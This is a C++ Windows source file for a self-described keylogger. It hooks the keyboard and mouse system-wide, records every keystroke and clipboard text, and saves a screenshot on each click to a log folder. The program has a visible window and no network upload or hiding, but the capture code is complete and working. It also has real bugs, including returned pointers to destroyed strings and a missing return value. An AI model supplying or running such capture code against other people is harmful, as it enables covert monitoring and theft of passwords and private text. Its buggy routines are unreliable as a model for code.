/**************************************************************************************************
 * Author: Jonathan Roop.                                                                         *
 *                                                                                                *
 * The main window of a simple keylogger program. Low-level keyboard and mouse hooks should be    *
 * installed with SetWindowsHookEx before running the message loop; the clipboard will            *
 * automatically be hooked when the WM_CREATE message is handled. The keyboard and mouse hooks    *
 * are defined as member functions so that they have access to persistent variables such as       *
 * leftShiftDown and screenshotIndex.                                                             *
 **************************************************************************************************/

#include "MainWindow.h"
#include "COM_util.h"
#include <ShObjIdl.h> // Needed for COM's savefile dialog

// Static variables initialization:
std::wofstream MainWindow::logFile;
std::wstring MainWindow::logFolderName = std::wstring(L"");
std::wstring MainWindow::logFileName = std::wstring(L"");
BOOL MainWindow::capturing = FALSE;
BOOL MainWindow::leftShiftDown = FALSE;
BOOL MainWindow::rightShiftDown = FALSE;
BOOL MainWindow::leftControlDown = FALSE;
BOOL MainWindow::rightControlDown = FALSE;
BOOL MainWindow::leftAltDown = FALSE;
BOOL MainWindow::rightAltDown = FALSE;
BOOL MainWindow::capsLockOn = FALSE;
int MainWindow::screenshotIndex = 0;
std::map<WCHAR, WCHAR> MainWindow::shiftedCharacters = std::map<WCHAR, WCHAR>{ { L'a',L'A' },
{ L'b',L'B' },{ L'c',L'C' },{ L'd',L'D' },{ L'e',L'E' },{ L'f',L'F' },{ L'g',L'G' },
{ L'h',L'H' },{ L'i',L'I' },{ L'j',L'J' },{ L'k',L'K' },{ L'l',L'L' },{ L'm',L'M' },
{ L'n',L'N' },{ L'o',L'O' },{ L'p',L'P' },{ L'q',L'Q' },{ L'r',L'R' },{ L's',L'S' },
{ L't',L'T' },{ L'u',L'U' },{ L'v',L'V' },{ L'w',L'W' },{ L'x',L'X' },{ L'y',L'Y' },
{ L'z',L'Z' },{ L'`',L'~' },{ L'1',L'!' },{ L'2',L'@' },{ L'3',L'#' },{ L'4',L'$' },
{ L'5',L'%' },{ L'6',L'^' },{ L'7',L'&' },{ L'8',L'*' },{ L'9',L'(' },{ L'0',L')' },
{ L'-',L'_' },{ L'=',L'+' },{ L'[',L'{' },{ L']',L'}' },{ L'\\',L'|' },{ L';',L':' },
{ L'\'',L'"' },{ L',',L'<' },{ L'.',L'>' },{ L'/',L'?' },{ L' ',L' ' } };
std::unordered_set<WCHAR> MainWindow::letters = std::unordered_set<WCHAR>{ L'a', L'b', L'c', L'd',
L'e', L'f', L'g', L'h', L'i' ,L'j', L'k', L'l', L'm', L'n', L'o', L'p', L'q', L'r', L's', L't',
L'u', L'v', L'w', L'x', L'y', L'z' };

/**************************************************************************************************
 * Obligatory message handler for the main window's message queue. A WM_CREATE message will       *
 * prompt the program to create the GUI and register itself as a clipboard format listener, while *
 * WM_CLOSE and WM_DESTROY messages close the application. A WM_CLIPBOARDUPDATE message is        *
 * received whenever the contents of the clipboard change; the program responds by logging any    *
 * textual content on the clipboard. Clicking either the "Select Log Folder" or "Start Capturing" *
 * button will put a WM_COMMAND message on the queue; the program determines which button fired   *
 * the message, and either displays a standard File Open Dialog or toggles all keystroke, mouse,  *
 * and clipboard capturing. WM_PAINT and WM_SIZE are encountered whenever the GUI background      *
 * needs repainting or when the window has been resized, respectively. All other types of         *
 * messages are forwarded to the default Windows message handler, DefWindowProc.                  *
 *   Inputs:                                                                                      *
 *      uMsg: An unsigned integer indicating the type of message.                                 *
 *      wParam: A UINT_PTR pointing to additional info about the message (the exact contents      *
 *              depend on the message type; see Windows documentation).                           *
 *      lParam: A LONG_PTR pointing to additional info about the message (the exact contents      *
 *              depend on the message type; see Windows documentation).                           *
 *   return value: 0 if the function succeeds, -1 for unexpected outcomes, or whatever            *
 *   DefWindowProc returns for the miscellaneous messages that it handles.                        *
 **************************************************************************************************/
LRESULT MainWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CREATE:
		GenerateGUI();
		AddClipboardFormatListener(m_hwnd); // Hook into the clipboard
		return 0;
	case WM_CLOSE:
		DestroyWindow(m_hwnd);
		return 0;
	case WM_DESTROY:
		RemoveClipboardFormatListener(m_hwnd); // Unhook from the clipboard
		PostQuitMessage(0);
		return 0;
	case WM_CLIPBOARDUPDATE:
		if (capturing) CaptureClipboardContents();
		return 0;
	case WM_COMMAND:
	{
		// Determine which button was clicked and call its corresponding OnClick method:
		HWND controlHandle = (HWND)lParam;
		if (controlHandle == selectLogFolderButton) return SelectLogFolderOnClick();
		else if (controlHandle == startCapturingButton) return StartCapturingOnClick();
		else return -1;
	}
	case WM_PAINT:
		OnPaint();
		return 0;
	case WM_SIZE:
		Resize();
		return 0;
	default:
		return DefWindowProc(m_hwnd, uMsg, wParam, lParam);
	}
}

// Sets the name of the Window Class.
PCWSTR MainWindow::ClassName() const { return L"Main Window"; }

/**************************************************************************************************
 * Instantiates all child elements of the GUI window. This function is called only once, in       *
 * response to a WM_CREATE message. A WM_RESIZE message will be received soon after WM_CREATE, so *
 * there is no need to specify the positions or sizes the elements at this time.                  *
 *   return value: none                                                                           *
 **************************************************************************************************/
void MainWindow::GenerateGUI()
{
	staticLabel = CreateWindowEx(0L, TEXT("static"), TEXT("Log folder: \n<not specified>"),
		WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, m_hwnd, (HMENU)staticLabelID, NULL, NULL);
	selectLogFolderButton = CreateWindowEx(0L, TEXT("button"), TEXT("Select Log Folder..."),
		WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, m_hwnd, (HMENU)chooseLogFileButtonID, NULL, NULL);
	startCapturingButton = CreateWindowEx(0L, TEXT("button"), TEXT("Start Capturing"),
		WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, m_hwnd, (HMENU)chooseLogFileButtonID, NULL, NULL);
}

/**************************************************************************************************
 * Fills the GUI screen with a solid color. This function is called whenever the GUI is being     *
 * redrawn (child elements automatically draw themselves on top of this background).              *
 *   return value: none                                                                           *
 **************************************************************************************************/
void MainWindow::OnPaint()
{
	PAINTSTRUCT ps;
	HDC hdc = BeginPaint(m_hwnd, &ps);
	FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
	EndPaint(m_hwnd, &ps);
}

/**************************************************************************************************
 * Repositions all elements in the GUI. This function is called whenever the window has been      *
 * resized, requiring that all its child elements be moved around to make it look pretty again.   *
 * The entire window is also "invalidated" to force a repaint.                                    *
 *   return value: none.                                                                          *
 **************************************************************************************************/
void MainWindow::Resize()
{
	RECT clientArea;
	int windowHeight;
	int windowWidth;
	if (GetClientRect(m_hwnd, &clientArea))
	{
		windowHeight = clientArea.bottom;
		windowWidth = clientArea.right;
		SetWindowPos(staticLabel, HWND_TOP,
			standard_margin, //-------------------------------------------- x
			standard_margin, //-------------------------------------------- y
			windowWidth - 2 * standard_margin, //-------------------------- width
			windowHeight - 3 * standard_margin - button_height, //--------- height
			0);
		SetWindowPos(selectLogFolderButton, HWND_TOP,
			standard_margin, //-------------------------------------------- x
			windowHeight - standard_margin - button_height, //------------- y
			choose_log_folder_button_width, //----------------------------- width
			button_height, //---------------------------------------------- height
			0);
		SetWindowPos(startCapturingButton, HWND_TOP,
			windowWidth - standard_margin - toggle_capture_button_width, // x
			windowHeight - standard_margin - button_height, //------------- y
			toggle_capture_button_width, //-------------------------------- width
			button_height, //---------------------------------------------- height
			0);
	}

	InvalidateRect(m_hwnd, NULL, FALSE); // forces a repaint of the entire client area of the window
}

/**************************************************************************************************
 * Displays a File Open Dialog whenever the Select Log Folder button is clicked. Once a folder is *
 * chosen, the keylog filename is set and the GUI displays the location of the chosen folder.     *
 *   return value: 0 if the operation is successful, or -1 if one of the necessary operations     *
 *   fails.                                                                                       *
 **************************************************************************************************/
int MainWindow::SelectLogFolderOnClick()
{
	// Create the FileOpen dialog object:
	IFileOpenDialog *pFolderSelect;
	HRESULT hr = CoCreateInstance(CLSID_FileOpenDialog, NULL, CLSCTX_ALL,
		IID_IFileOpenDialog, reinterpret_cast<void**>(&pFolderSelect));
	if (SUCCEEDED(hr))
	{
		// Change the dialog options so that the user selects a folder instead of a file:
		FILEOPENDIALOGOPTIONS options;
		hr = pFolderSelect->GetOptions(&options);
		if (SUCCEEDED(hr))
		{
			hr = pFolderSelect->SetOptions(options | FOS_PICKFOLDERS);
			if (SUCCEEDED(hr))
			{
				//Show the dialog box:
				hr = pFolderSelect->Show(NULL);

				//Grab the folder name from the dialog box:
				if (SUCCEEDED(hr))
				{
					IShellItem *pItem;
					hr = pFolderSelect->GetResult(&pItem);
					if (SUCCEEDED(hr))
					{
						PWSTR pszFilePath;
						hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
						if (SUCCEEDED(hr))
						{
							//set the log filename
							logFolderName = std::wstring(pszFilePath);
							logFileName = logFolderName + std::wstring(L"\\keyLog.txt");

							//set a static text field to show the folder display name
							std::wstring message(L"Log folder: \n");
							message += logFolderName;
							SendMessage(staticLabel, WM_SETTEXT, NULL, (LPARAM)message.c_str());

							//clean up
							CoTaskMemFree(pszFilePath);
							return 0;
						}
					}
				}
			}
		}
		SafeRelease(&pFolderSelect);
	}
	return -1;
}

/**************************************************************************************************
 * Toggles a boolean variable to allow logging to begin. If logging is being turned on, then the  *
 * log file is opened for appending (if the file does not exist yet, it is created). If logging   *
 * is being turned off, then the log file is closed. This function is called whenever the Start   *
 * Capturing button is clicked; its text is updated to indicate the current capturing state to    *
 * the user.                                                                                      *
 *   return value: always 0.                                                                      *
 **************************************************************************************************/
int MainWindow::StartCapturingOnClick()
{
	if (logFileName == L"")
	{
		MessageBox(m_hwnd, L"You must specify a folder in which to save the log files",
			NULL, MB_OK | MB_ICONEXCLAMATION);
		return 0;
	}
	capturing = !capturing;
	if (capturing)
	{
		SendMessage(startCapturingButton, WM_SETTEXT, NULL, (LPARAM)L"Stop Capturing");
		logFile = std::wofstream();
		logFile.open(logFileName, std::wofstream::app);
		return 0;
	}
	else
	{
		SendMessage(startCapturingButton, WM_SETTEXT, NULL, (LPARAM)L"Start Capturing");
		logFile.close();
		return 0;
	}
}

/**************************************************************************************************
 * Logs any textual content of the clipboard to the log file. This function is called in response *
 * to a WM_CLIPBOARDUPDATE message, which is received whenever the contents of the clipboard      *
 * change.                                                                                        *
 *   return value: none                                                                           *
 **************************************************************************************************/
void MainWindow::CaptureClipboardContents()
{
	if (OpenClipboard(m_hwnd))
	{
		if (IsClipboardFormatAvailable(CF_UNICODETEXT))
		{
			HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
			if (hglb != NULL)
			{
				WCHAR* lptstr = (WCHAR*)GlobalLock(hglb);
				if (lptstr != NULL)
				{
					logFile << L"<CLIPBOARD_TEXT: " << lptstr << L">";
					GlobalUnlock(hglb);
				}
			}
		}
		CloseClipboard();
	}
}

/**************************************************************************************************
 * Keyboard hook event handler. Logs keystrokes to the logfile. Keeps track of whether Shift,     *
 * Control, and Alt keys are held down. Also keeps track of caps lock, and will print capital or  *
 * shifted characters when appropriate (standard US keyboard is assumed). Note: In order for      *
 * LowLevelKeyboardProc's signature to match what SetWindowsHookEx is expecting, this function    *
 * *must* be static; non-static functions have a hidden "this" parameter that ruins the           *
 * signature. As a consequence, all of LowLevelKeyboardProc's helper functions are also static.   *
 *   Inputs:                                                                                      *
 *      nCode: An integer code that indicates how the message should be processed. If the code is *
 *             less than 0, it should be passed immediately to CallNextHookEx. See Windows docs.  *
 *      wParam: A code that indicates what type of keystroke event occurred. There are 4 possible *
 *              values: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, and WM_SYSKEYUP.                     *
 *      lParam: A pointer to a KBDLLHOOKSTRUCT structure, which contains info on the captured     *
 *              keystroke.                                                                        *
 *   return value: Whatever the next hook in the chain returns (via CallNextHookEx).              *
 **************************************************************************************************/
LRESULT MainWindow::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT pKeyboardHookStruct = (PKBDLLHOOKSTRUCT)lParam;
	if (capturing && nCode == HC_ACTION)
	{
		switch (wParam) // Four possible values according to the docs. 1 function for each case:
		{
		case WM_KEYDOWN: // A key other than ALT or F-10 is pressed and ALT is not down
			logFile << translateKeyDown(pKeyboardHookStruct);
			break;
		case WM_KEYUP: // A key is released (including ALT or F-10)
			logFile << translateKeyUp(pKeyboardHookStruct);
			break;
		case WM_SYSKEYDOWN: // ALT or F-10 is pressed, or a key is pressed while ALT is down
			logFile << translateSysKeyDown(pKeyboardHookStruct);
			break;
		case WM_SYSKEYUP: // A key is released while ALT is down
			logFile << translateSysKeyUp(pKeyboardHookStruct);
			break;
		}
	}
	// Pass the keypress to the program that was actually supposed to receive it or to the next
	// hook in the chain:
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/**************************************************************************************************
 * Processes a WM_KEYDOWN event intercepted by the keyboard hook. Such an event occurs when a key *
 * other than ALT or F-10 is pressed. If a printable character is entered on the keyboard, this   *
 * function simply returns that character. If Shift, Control, or Caps lock are pressed, a         *
 * relevant boolean variable is toggled. Otherwise, a useful message is returned, such as         *
 * "<PAGEUP_KEY>" when the page-up key is pressed.                                                *
 *   Inputs:                                                                                      *
 *      pKkeyboardHookStruct: A pointer to a KBDLLHOOKSTRUCT structure, which contains info on    *
 *                            captured keystroke.                                                 *
 *   return value: A wide-character string to be written to the log file.                         *
 **************************************************************************************************/
WCHAR* MainWindow::translateKeyDown(PKBDLLHOOKSTRUCT pKeyboardHookStruct)
{
	std::wstring translatedKey(L"");
	switch (pKeyboardHookStruct->vkCode)
	{
	case VK_LSHIFT:
		leftShiftDown = TRUE;
		return L"";
	case VK_RSHIFT:
		rightShiftDown = TRUE;
		return L"";
	case VK_TAB:
		if (leftShiftDown || rightShiftDown) return L"<SHIFT-TAB>";
		else return L"<TAB>";
	case VK_CAPITAL:
		capsLockOn = !capsLockOn;
		return L"";
	case VK_LCONTROL:
		if (!leftControlDown) // To prevent duplicate messages when key is held down
		{
			leftControlDown = TRUE;
			return L"<L_CTRL+";
		}
	case VK_RCONTROL:
		if (!rightControlDown) // To prevent duplicate messages when key is held down
		{
			rightControlDown = TRUE;
			return L"<R_CTRL+";
		}
	case VK_PACKET: // VK_PACKET is used to send unicode characters as if they were keystrokes.
	{
		translatedKey = ((pKeyboardHookStruct->scanCode) << 16) >> 16;
		return (WCHAR*)translatedKey.std::wstring::c_str();
	}
	case VK_RETURN:
		return L"<ENTER>";
	case VK_NEXT:
		return L"<PAGEDOWN_KEY>";
	case VK_PRIOR:
		return L"<PAGEUP_KEY>";
	case VK_END:
		return L"<END_KEY>";
	case VK_HOME:
		return L"<HOME_KEY>";
	case VK_UP:
		return L"<UP_ARROW>";
	case VK_DOWN:
		return L"<DOWN_ARROW>";
	case VK_LEFT:
		return L"<LEFT_ARROW>";
	case VK_RIGHT:
		return L"<RIGHT_ARROW>";
	case VK_INSERT:
		return L"<INSERT_KEY>";
	case VK_DELETE:
		return L"<DELETE_KEY>";
	case VK_NUMLOCK:
		return L"<NUMLOCK_KEY>";
	case VK_SCROLL:
		return L"<SCROLL_LOCK>";
	case VK_ESCAPE:
		return L"<ESCAPE_KEY>";
	default:
	{
		BYTE keyboardState[256];
		WCHAR uniCharacter[2];
		GetKeyboardState(keyboardState);
		switch (ToUnicodeEx(pKeyboardHookStruct->vkCode, pKeyboardHookStruct->scanCode, 
			    keyboardState, uniCharacter, 2, 0, NULL))
		{
		case -1:
		{
			return L"<DeadKey>";
		}
		case 0:
		{
			translatedKey = std::wstring(L"<UnknownKey. VK_CODE=") 
				+ std::to_wstring(pKeyboardHookStruct->vkCode) + std::wstring(L">");
			return (WCHAR*)translatedKey.std::wstring::c_str();
		}
		case 1:
		{
			if (letters.find(uniCharacter[0]) != letters.end()) // Character is a letter
			{
				// If shift or capsLock are active (but not both!), use uppercase letter.
				if ((leftShiftDown || rightShiftDown || capsLockOn)
					&& !((leftShiftDown || rightShiftDown) && capsLockOn))
				{
					uniCharacter[0] = shiftedCharacters[uniCharacter[0]];
				}
			}
			else // Character is a number or symbol. 
			{
				if (leftShiftDown || rightShiftDown)
				{
					uniCharacter[0] = shiftedCharacters[uniCharacter[0]];
				}
			}
			translatedKey = std::wstring(uniCharacter, 1);
			return (WCHAR*)translatedKey.std::wstring::c_str();
		}
		default:
			return L"<ProbablyDeadKey>";
		}
	}
	}
}

/**************************************************************************************************
 * Processes a WM_KEYUP event intercepted by the keyboard hook. Such an event occurs when any key *
 * is released. The only keys of interest here are Shift, Control, and Alt. When one of these     *
 * keys is released, a relevant boolean variable is toggled.                                      *
 *      pKkeyboardHookStruct: A pointer to a KBDLLHOOKSTRUCT structure, which contains info on    *
 *                            captured keystroke.                                                 *
 *   return value: A wide-character string to be written to the log file. For Control and Alt,    *
 *   the return value is the closing angle bracket on a message like "<L_CTRL+s>"                 *
 **************************************************************************************************/
WCHAR* MainWindow::translateKeyUp(PKBDLLHOOKSTRUCT pKeyboardHookStruct)
{
	switch (pKeyboardHookStruct->vkCode)
	{
	case VK_LSHIFT:
		leftShiftDown = FALSE;
		return L"";
	case VK_RSHIFT:
		rightShiftDown = FALSE;
		return L"";
	case VK_LCONTROL:
		leftControlDown = FALSE;
		return L">";
	case VK_RCONTROL:
		rightControlDown = FALSE;
		return L">";
	case VK_LMENU:
		leftAltDown = FALSE;
		return L">";
	case VK_RMENU:
		rightAltDown = FALSE;
		return L">";
	default:
		return L"";
	}
}

/**************************************************************************************************
 * Processes a WM_SYSKEYDOWN event intercepted by the keyboard hook. Such an event occurs when    *
 * either Alt or F-10 is pressed, or when any key is pressed while Alt is held down. If an Alt    *
 * key is pressed, a relevant boolean variable is toggled. If F-10 is pressed, "<F10>" is         *
 * returned. Otherwise, translateKeyDown() is called, which will either return the keyboard       *
 * character that was entered or an appropriate message such as "<PAGEUP_KEY>" when the pageup    *
 * key is pressed. translateKeyDown() is the same function used for processing normal WM_KEYDOWN  *
 * messages.                                                                                      *
 *      pKkeyboardHookStruct: A pointer to a KBDLLHOOKSTRUCT structure, which contains info on    *
 *                            captured keystroke.                                                 *
 *   return value: A wide-character string to be written to the log file.                         *
 **************************************************************************************************/
WCHAR* MainWindow::translateSysKeyDown(PKBDLLHOOKSTRUCT pKeyboardHookStruct)
{
	switch (pKeyboardHookStruct->vkCode)
	{
	case VK_LMENU:
		if (!leftAltDown) // To prevent duplicate messages when key is held down.
		{
			leftAltDown = TRUE;
			return L"<LEFT_ALT+";
		}
	case VK_RMENU:
		if (!rightAltDown) // To prevent duplicate messages when key is held down.
		{
			rightAltDown = TRUE;
			return L"<RIGHT_ALT+";
		}
	case VK_F10:
		return L"<F10>";
	default:
		return translateKeyDown(pKeyboardHookStruct);
	}
}

/**************************************************************************************************
 * Processes a WM_SYSKEYUP event intercepted by the keyboard hook. Such an event occurs when any  *
 * key is released while Alt is held down. There is nothing of unique interest to log in this     *
 * case, because the relevant keystrokes are already logged during the WM_SYSKEYDOWN and WM_KEYUP *
 * events.                                                                                        *
 *      pKkeyboardHookStruct: A pointer to a KBDLLHOOKSTRUCT structure, which contains info on    *
 *                            captured keystroke.                                                 *
 *   return value: An empty wide-character string                                                 *
 **************************************************************************************************/
WCHAR* MainWindow::translateSysKeyUp(PKBDLLHOOKSTRUCT pKeyboardHookStruct)
{
	return L"";
}

/**************************************************************************************************
 * Mouse hook event handler. Takes a screenshot when either the left or right mouse button is     *
 * clicked, marking the location of the cursor with crosshairs. Other mouse events are simply     *
 * written to the log. Note: In order for LowLevelMouseProc's signature to match what             *
 * SetWindowsHookEx is expecting, this function *must* be static; non-static functions have a     *
 * hidden "this" parameter that ruins the signature. As a consequence, all of LowLevelMouseProc's *
 * helper functions are also static.                                                              *
 *   Inputs:                                                                                      *
 *      nCode: An integer code that indicates how the message should be processed. If the code is *
 *             less than 0, it should be passed immediately to CallNextHookEx. See Windows docs.  *
 *      wParam: A code that indicates what type of mouse event occurred. There are 7 possible     *
 *              values: WM_LBUTTONDOWN, WM_LBUTTONUP, WM_MOUSEMOVE, WM_MOUSEHWHEEL,               *
 *              WM_MOUSEHWHEEL, WM_RBUTTONDOWN, and WM_RBUTTONUP.                                 *
 *      lParam: A pointer to a MSLLHOOKSTRUCT structure, which contains info on the captured      *
 *              mouse event.                                                                      *
 *   return value: Whatever the next hook in the chain returns (via CallNextHookEx).              *
 **************************************************************************************************/
LRESULT MainWindow::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (capturing && nCode == HC_ACTION)
	{
		switch (wParam) // Only seven possible values according to the docs. One case for each:
		{
		case WM_LBUTTONDOWN:
			logFile << L"<LEFT_MOUSEBUTTON_DOWN>";
			takeScreenshot(screenshotIndex);
			logFile << L"<(SCREENSHOT_" << screenshotIndex << L" TAKEN)>";
			screenshotIndex++;
			break;
		case WM_LBUTTONUP:
			logFile << L"<LEFT_MOUSEBUTTON_UP>";
			break;
		case WM_MOUSEMOVE:
			//logFile << L"<MOUSE_MOVE>";
			break;
		case WM_MOUSEWHEEL:
			logFile << L"<MOUSE_WHEEL>";
			break;
		case WM_MOUSEHWHEEL:
			logFile << L"<MOUSE_HORIZONTAL_WHEEL>";
			break;
		case WM_RBUTTONDOWN:
			logFile << L"<RIGHT_MOUSEBUTTON_DOWN>";
			takeScreenshot(screenshotIndex);
			logFile << L"<(SCREENSHOT_" << screenshotIndex << L" TAKEN)>";
			screenshotIndex++;
			break;
		case WM_RBUTTONUP:
			logFile << L"<RIGHT_MOUSEBUTTON_UP>";
			break;
		}
	}
	// Pass the mouse event to the program that was actually supposed to receive it or to the 
	// next hook in the chain:
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/**************************************************************************************************
 * Takes a screenshot of the primary display and saves it to a .bmp file in the log folder. The   *
 * file is named "Screenshot_#.bmp" where # is an integer index that is incremented after each    *
 * screenshot.                                                                                    *
 *   Inputs:                                                                                      *
 *      screenshotIndex: The index to use for the name of the screenshot.                         *
 *   return value: none                                                                           *
 * Credits: In addition to MSDN, I used Doug Brown's code at www.daniweb.com/programming/         *
 * software-development/threads/119804/screenshot-maybe-win32api#post593378 and Matthew Van       *
 * Eerde's pseudocode at blogs.msdn.microsoft.com/matthew_van_eerde as references while writing   *
 * takeScreenshot() and its helper functions.                                                     *
 **************************************************************************************************/
void MainWindow::takeScreenshot(int screenshotIndex)
{
	// Gather resources for the screenshot operation. Notes: An HBITMAP is a handle to a 
	// collection of structures for holding the bitmap in memory. SelectObject selects that 
	// collection into the memoryContext so we can use the memoryContext for drawing operations.
	HDC screenContext = GetDC(NULL);
	HDC memoryContext = CreateCompatibleDC(screenContext);
	RECT screenDimensions;
	GetClientRect(GetDesktopWindow(), &screenDimensions);
	int width = screenDimensions.right;
	int height = screenDimensions.bottom;
	HBITMAP memoryBitmap = CreateCompatibleBitmap(screenContext, width, height);
	HGDIOBJ graphicsObject = SelectObject(memoryContext, memoryBitmap);

	// Copy the contents of the screen into the memory-bitmap:
	BitBlt(memoryContext, 0, 0, width, height, screenContext, 0, 0, SRCCOPY);

	// Draw crosshairs on the bmp image to show where the cursor is:
	markCursorPosition(memoryContext, width, height);

	// Retrieve the bitmap metadata:
	PBITMAPINFO pbmi = getBitmapMetadata(memoryBitmap);

	// The memory bitmap must be de-selected before GetDIBits will work (GetDIBits is called 
	// within writeBMP later). This is accomplished by re-selecting the original graphicsObject
	// returned earlier by SelectObject back into the memoryContext.
	SelectObject(memoryContext, graphicsObject);

	// Write the bitmap to a file:
	if (pbmi)
	{
		std::wstring filename = logFolderName + (L"\\screenshot_")
			+ std::to_wstring(screenshotIndex) + L".bmp";
		WriteBMP(filename.c_str(), pbmi, memoryBitmap, memoryContext);
		LocalFree(pbmi);
	}

	// Clean up:
	DeleteDC(memoryContext);
	ReleaseDC(NULL, screenContext);
	DeleteObject(memoryBitmap);
}

/**************************************************************************************************
 * Retrieves metadata about a bitmap stored in memory. This is needed for the GetDIBits function  *
 * and for writing the .bmp header.                                                               *
 *   Inputs:                                                                                      *
 *      memoryBitmap: A handle to a collection of structures containing the bitmap in memory.     *
 *   return value: A pointer to a BITMAPINFO structure, which stores metadata about a bitmap.     *
 **************************************************************************************************/
PBITMAPINFO MainWindow::getBitmapMetadata(HBITMAP memoryBitmap)
{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	if (GetObject(memoryBitmap, sizeof(BITMAP), (LPSTR)&bmp))
	{
		// Determine the number of bits used per pixel in the bitmap:
		WORD numBits = (WORD)(bmp.bmPlanes*bmp.bmBitsPixel);
		if (numBits == 1) numBits = 1;
		else if (numBits <= 4) numBits = 4;
		else if (numBits <= 8) numBits = 8;
		else if (numBits <= 16) numBits = 16;
		else if (numBits <= 24) numBits = 24;
		else numBits = 32;

		// Allocate enough memory to hold the metadata structure. if numBits is less than 24,
		// then there is a color table that must be accounted for:
		if (numBits < 24) pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER)
			+ sizeof(RGBQUAD)*(1 << numBits));
		else pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

		// fill the metadata structure:
		if (pbmi)
		{
			ZeroMemory(&pbmi->bmiHeader, sizeof(BITMAPINFOHEADER)); // initialize with zeros
			pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
			pbmi->bmiHeader.biWidth = bmp.bmWidth;
			pbmi->bmiHeader.biHeight = bmp.bmHeight;
			pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
			pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
			if (numBits < 24) pbmi->bmiHeader.biClrUsed = (1 << numBits);
			pbmi->bmiHeader.biCompression = BI_RGB; // not compressed.
			pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth*numBits + 31)&~31) / 8
				* pbmi->bmiHeader.biHeight;
			pbmi->bmiHeader.biClrImportant = 0;
			return pbmi;
		}
	}
}

/**************************************************************************************************
 * Draws crosshairs on a screenshot to indicate where the user clicked. The crosshairs are drawn  *
 * using the DrawEdge function, which produces lines with a gradient fill that show up well       *
 * against any background.                                                                        *
 *   Inputs:                                                                                      *
 *      memoryContext: A handle to the memory-type device context containing the Bitmap. See      *
 *                     Windows documentation on Device contexts.                                  *
 *      width: The width of the screen, in pixels                                                 *
 *      height: The height of the screen, in pixels.                                              *
 *   return value: none                                                                           *
 **************************************************************************************************/
void MainWindow::markCursorPosition(HDC memoryContext, int width, int height)
{
	POINT cursorPosition;
	GetCursorPos(&cursorPosition);
	LONG cursorX = cursorPosition.x;
	LONG cursorY = cursorPosition.y;
	RECT verticalCrosshair = { cursorPosition.x, 0, cursorPosition.x, height };
	RECT horizontalCrosshair = { 0, cursorPosition.y, width, cursorPosition.y };
	DrawEdge(memoryContext, &verticalCrosshair, EDGE_RAISED, BF_RECT);
	DrawEdge(memoryContext, &horizontalCrosshair, EDGE_RAISED, BF_RECT);
}

/**************************************************************************************************
 * Writes the bitmap stored in memBmp to a new file with the specified filename. The memory       *
 * context into which the bitmap is selected must also be specified, as well as a pointer to a    *
 * BITMAPINFO containing metadata about the image.                                                *
 *   Inputs:                                                                                      *
 *      filename: A pointer to a long-character string containing the name of the file to be      *
 *                written.                                                                        *
 *      pbmi: A pointer to the BITMAPINFO structure containing metadata about the image.          *
 *      memBmp: A handle to a collection of structures containing the bitmap in memory.           *
 *      memContext: A handle to the memory-type device context containing the Bitmap. See         *
 *                     Windows documentation on Device contexts.                                  *
 *   return value: none                                                                           *
 **************************************************************************************************/
void MainWindow::WriteBMP(LPCWSTR filename, PBITMAPINFO pbmi, HBITMAP memBmp, HDC memContext)
{
	PBITMAPINFOHEADER pbih = (PBITMAPINFOHEADER)pbmi;
	LPBYTE colorBytes = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
	if (colorBytes != NULL)
	{
		// Use GetDIBits to copy the image bytes into the array colorBytes:
		if (GetDIBits(memContext, memBmp, 0, (WORD)pbih->biHeight, colorBytes, pbmi,
			DIB_RGB_COLORS))
		{
			HANDLE hf = CreateFile(filename, GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS,
				FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
			if (hf != INVALID_HANDLE_VALUE)
			{
				// Create the header:
				BITMAPFILEHEADER hdr;
				hdr.bfType = 0x4d42; // Characters "BM"
				hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize
					+ pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
				hdr.bfReserved1 = 0;
				hdr.bfReserved2 = 0;
				hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize
					+ pbih->biClrUsed * sizeof(RGBQUAD);

				// Write the file header:
				DWORD dwTMP;
				WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTMP, NULL);

				// Write the bitmap info header and the colormap:
				WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
					+ pbih->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&dwTMP, NULL);

				// Finally, write the actual color bytes:
				WriteFile(hf, (LPSTR)colorBytes, (int)pbih->biSizeImage, (LPDWORD)&dwTMP, NULL);

				CloseHandle(hf);
			}
		}
		GlobalFree((HGLOBAL)colorBytes);
	}
}